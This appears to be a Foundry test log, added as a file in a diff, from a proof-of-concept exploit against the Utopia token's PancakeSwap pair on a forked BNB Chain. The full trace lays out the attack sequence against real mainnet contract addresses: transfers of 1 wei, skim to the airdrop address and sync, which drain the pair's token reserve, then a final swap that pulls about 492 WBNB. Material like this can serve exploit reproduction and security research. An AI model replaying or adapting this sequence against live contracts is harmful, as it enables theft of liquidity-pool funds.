@@ -1,0 +1,259 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Utopia_exp.sol:UtopiaTest
+[PASS] testExploit() (gas: 725734)
+Logs:
+  Attacker WBNB balance before exploit: 0.010000000000000000
+  Attacker WBNB balance after exploit: 492.088605739133158123
+
+Traces:
+  [17785] UtopiaTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 30119396 [3.011e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333], "Utopia")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], "Pair")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [912433] UtopiaTest::testExploit()
+    ├─ [2534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c])
+    │   └─ ← [Return] [0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []
+    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
+    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
+    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x000000000000000000000000000000000000000000000000002386f26fc10000)
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 10000000000000000 [1e16]
+    ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x0072fde0c25a54a99a0517f551c3cabc4c49d9ef3648fd789a3f57d0243cdb90: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [24653] Utopia::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 10000000000000000 [1e16]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance before exploit", val: 10000000000000000 [1e16], decimals: 18)
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 10000000000000000 [1e16]
+    ├─ [183597] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(10000000000000000 [1e16], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xb1da08C472567eb0EC19639b1822F578d39F3333], UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1689831488 [1.689e9])
+    │   ├─ [8225] WBNB::transferFrom(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 10000000000000000 [1e16])
+    │   │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 10000000000000000 [1e16])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x369c9ef0b681f884bd4db54606d93f5fa20d8759af7066ba5680edcc5e5fb158: 0x00000000000000000000000000000000000000000000001b82e820c5996cc76c → 0x00000000000000000000000000000000000000000000001b830ba7b8092dc76c
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000000002386f26fc10000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ [2604] Utopia::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] Pair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 1768838349283261391642 [1.768e21], 507494915442740086636 [5.074e20], 1689830206 [1.689e9]
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ [159045] Pair::swap(34766487705582530 [3.476e16], 0, UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [124595] Utopia::transfer(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 34766487705582530 [3.476e16])
+    │   │   │   ├─ emit Transfer(from: 0x7e60087331970B3C52e4B7E5b1ffBffFb5F77bfE, to: 0x7e60087331970B3C52e4B7E5b1ffBffFb5F77bfE, value: 1)
+    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333], value: 347664877055825 [3.476e14])
+    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0x000000000000000000000000000000000000dEaD, value: 347664877055825 [3.476e14])
+    │   │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 34071157951470880 [3.407e16])
+    │   │   │   ├─ [2439] Pair::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   │   │   ├─ [2600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
+    │   │   │   │   └─ ← [Return] 276183063853411415 [2.761e17]
+    │   │   │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000000000000790b89a2c89d20
+    │   │   │   │   @ 23: 0x000000000000000000000000ff2651b286694ed2fd2fc8907f5fdfedccfffdff → 0x0000000000000000000000007e60087331970b3c52e4b7e5b1ffbfffb5f77bfe
+    │   │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0x00000000000000000000000000000000000000000000011b56c536010ad98808 → 0x00000000000000000000000000000000000000000000011b56c672341458f759
+    │   │   │   │   @ 0x27d41c83a19f0c7742858d6908eeb893546672e210a9bad42289473f2a1d832b: 0x00000000000000000000000000000000000000000000005fe39032f7451fa31a → 0x00000000000000000000000000000000000000000000005fe314af078f582758
+    │   │   │   │   @ 0x6dbcb5aa5929000ccae2377f1ce0fa6e9b64748b6d890f92fcac06c2ff6e2b57: 0 → 1
+    │   │   │   │   @ 0xd2685f3a9f62f64d5b30b617d1d9d30467cc87f1da8d167822c29320c4c4c5fb: 0x00000000000000000000000000000000000000000000000017fd586a6f6de969 → 0x00000000000000000000000000000000000000000000000017fe949d78ed58ba
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   │   └─ ← [Return] 1768803582795555809112 [1.768e21]
+    │   │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   │   ├─ emit Sync(reserve0: 1768803582795555809112 [1.768e21], reserve1: 507504915442740086636 [5.075e20])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 10000000000000000 [1e16], amount0Out: 34766487705582530 [3.476e16], amount1Out: 0, to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─  storage changes:
+    │   │   │   @ 9: 0x0000000000000000000000000000003fe1ba51707077923806c8ad07ae493a2a → 0x0000000000000000000000000000003fe20b39f1b01132ca2eca683cbd5cb4e2
+    │   │   │   @ 8: 0x64b8c33e00000000001b82e820c5996cc76c00000000005fe39032f7451fa31a → 0x64b8c45800000000001b830ba7b8092dc76c00000000005fe314af078f582758
+    │   │   │   @ 10: 0x000000000000000000000000000002a34afd137ed18e3217081a8749dc4ed90d → 0x000000000000000000000000000002a34ed3f7b50a1f83e57ff36e140ca29b91
+    │   │   └─ ← [Stop]
+    │   ├─ [604] Utopia::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 34071157951470880 [3.407e16]
+    │   └─ ← [Stop]
+    ├─ [91210] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 1)
+    │   ├─ [893] Pair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 1768803582795555809112 [1.768e21], 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ emit Transfer(from: 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD, to: 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD, value: 1)
+    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
+    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─  storage changes:
+    │   │   @ 0x656a58a816e1cb94819990f5ca6842dbcc9a3f40d87f1880909930b35933fe42: 0 → 1
+    │   │   @ 23: 0x0000000000000000000000007e60087331970b3c52e4b7e5b1ffbfffb5f77bfe → 0x000000000000000000000000ff2651b286694ed2fd2fc8907f0e5da6fc7159bd
+    │   │   @ 21: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 22: 0x00000000000000000000000000000000000000000000000005f8ac615ac8ddb8 → 1
+    │   │   @ 0x27d41c83a19f0c7742858d6908eeb893546672e210a9bad42289473f2a1d832b: 0x00000000000000000000000000000000000000000000005fe314af078f582758 → 0x00000000000000000000000000000000000000000000005fe314af078f582759
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000000000790b89a2c89d20 → 0x00000000000000000000000000000000000000000000000000790b89a2c89d1f
+    │   └─ ← [Return] true
+    ├─ [448] Utopia::lastAirdropAddress() [staticcall]
+    │   └─ ← [Return] 0xfF2651B286694eD2fD2Fc8907f0E5DA6fC7159bD
+    ├─ [55084] Pair::skim(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD)
+    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 1768803582795555809113 [1.768e21]
+    │   ├─ [41217] Utopia::transfer(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, 1)
+    │   │   ├─ [2537] Pair::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
+    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, value: 1)
+    │   │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
+    │   │   │   └─ ← [Return] 276183063853411415 [2.761e17]
+    │   │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   │   ├─  storage changes:
+    │   │   │   @ 21: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   @ 0xba4c95abda68fabad6ab90e3500e8607739d535303caea49ef0701b6caa3cef8: 0 → 1
+    │   │   │   @ 0x27d41c83a19f0c7742858d6908eeb893546672e210a9bad42289473f2a1d832b: 0x00000000000000000000000000000000000000000000005fe314af078f582759 → 0
+    │   │   │   @ 23: 0x000000000000000000000000ff2651b286694ed2fd2fc8907f0e5da6fc7159bd → 0x000000000000000000000000feef619a56fce9d003e20bf61393d18f62b0b2d5
+    │   │   └─ ← [Return] true
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ [5262] WBNB::transfer(0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, 0)
+    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: 0xFF2651b286694ED2fd2fC8907F0E5DA6FdFBddfD, value: 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [9050] Pair::sync()
+    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ emit Sync(reserve0: 0, reserve1: 507504915442740086636 [5.075e20])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x64b8c45800000000001b830ba7b8092dc76c00000000005fe314af078f582758 → 0x64b8c45800000000001b830ba7b8092dc76c0000000000000000000000000000
+    │   └─ ← [Stop]
+    ├─ [80031] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 1)
+    │   ├─ [893] Pair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 0, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ emit Transfer(from: 0x7fa9385Be102Ac3eaC297483dD6233D62A7511b7, to: 0x7fa9385Be102Ac3eaC297483dD6233D62A7511b7, value: 1)
+    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 1)
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
+    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─  storage changes:
+    │   │   @ 0x27d41c83a19f0c7742858d6908eeb893546672e210a9bad42289473f2a1d832b: 0 → 1
+    │   │   @ 21: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 23: 0x000000000000000000000000feef619a56fce9d003e20bf61393d18f62b0b2d5 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62a7511b7
+    │   │   @ 0x197cdc21c7e1ba408e1926dfe5f26f080e6b67061c208e1f3809b52829f9b25d: 0 → 1
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000000000790b89a2c89d1f → 0x00000000000000000000000000000000000000000000000000790b89a2c89d1e
+    │   └─ ← [Return] true
+    ├─ [9050] Pair::sync()
+    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ emit Sync(reserve0: 1, reserve1: 507504915442740086636 [5.075e20])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x64b8c45800000000001b830ba7b8092dc76c0000000000000000000000000000 → 0x64b8c45800000000001b830ba7b8092dc76c0000000000000000000000000001
+    │   └─ ← [Stop]
+    ├─ [893] Pair::getReserves() [staticcall]
+    │   └─ ← [Return] 1, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
+    ├─ [1021] Router::getAmountOut(32, 1, 507504915442740086636 [5.075e20]) [staticcall]
+    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001aad19ebb8fa47c2eb
+    ├─ [81481] Utopia::transfer(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], 32)
+    │   ├─ [537] Pair::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [893] Pair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 1, 507504915442740086636 [5.075e20], 1689830488 [1.689e9]
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 507504915442740086636 [5.075e20]
+    │   ├─ emit Transfer(from: 0xfEEf619a56FCe9D003E20bF61393D18f627133b4, to: 0xfEEf619a56FCe9D003E20bF61393D18f627133b4, value: 1)
+    │   ├─ emit Transfer(from: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], value: 32)
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─ [600] 0x5debB0fe5BE72DfEAC56a11080253b4eD1eC6cb9::balanceOf(Utopia: [0xb1da08C472567eb0EC19639b1822F578d39F3333]) [staticcall]
+    │   │   └─ ← [Return] 276183063853411415 [2.761e17]
+    │   ├─ [439] Pair::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 901613998033696273822 [9.016e20]
+    │   ├─  storage changes:
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000000000790b89a2c89d1e → 0x00000000000000000000000000000000000000000000000000790b89a2c89cfe
+    │   │   @ 22: 1 → 32
+    │   │   @ 0x19356e5a6c380ab60f28e05b129d98511665eeaac11306526722d709e7bb0c69: 0 → 1
+    │   │   @ 0x27d41c83a19f0c7742858d6908eeb893546672e210a9bad42289473f2a1d832b: 1 → 33
+    │   │   @ 23: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62a7511b7 → 0x000000000000000000000000feef619a56fce9d003e20bf61393d18f627133b4
+    │   └─ ← [Return] true
+    ├─ [39997] Pair::swap(0, 492088605739133158123 [4.92e20], UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [23162] WBNB::transfer(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 492088605739133158123 [4.92e20])
+    │   │   ├─ emit Transfer(from: Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 492088605739133158123 [4.92e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000001aad19ebb8fa47c2eb
+    │   │   │   @ 0x369c9ef0b681f884bd4db54606d93f5fa20d8759af7066ba5680edcc5e5fb158: 0x00000000000000000000000000000000000000000000001b830ba7b8092dc76c → 0x000000000000000000000000000000000000000000000000d5f1bbff0ee60481
+    │   │   └─ ← [Return] true
+    │   ├─ [1115] UtopiaTest::pancakeCall(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 492088605739133158123 [4.92e20], 0x00)
+    │   │   └─ ← [Stop]
+    │   ├─ [604] Utopia::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 33
+    │   ├─ [534] WBNB::balanceOf(Pair: [0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]) [staticcall]
+    │   │   └─ ← [Return] 15416309703606928513 [1.541e19]
+    │   ├─ emit Sync(reserve0: 33, reserve1: 15416309703606928513 [1.541e19])
+    │   ├─ emit Swap(sender: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 32, amount1In: 0, amount0Out: 0, amount1Out: 492088605739133158123 [4.92e20], to: UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x64b8c45800000000001b830ba7b8092dc76c0000000000000000000000000001 → 0x64b8c458000000000000d5f1bbff0ee604810000000000000000000000000021
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(UtopiaTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 492088605739133158123 [4.92e20]
+    ├─ [444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 492088605739133158123 [4.92e20], decimals: 18)
+    ├─  storage changes:
+    │   @ 0x396a7d57b1aea314023640b7ed728f666287564bb314d80a207216816c01c6de: 0 → 1
+    │   @ 0x396a7d57b1aea314023640b7ed728f666287564bb314d80a207216816c01c6db: 0 → 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.53s (14.36s CPU time)
+
+Ran 1 test suite in 18.14s (15.53s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
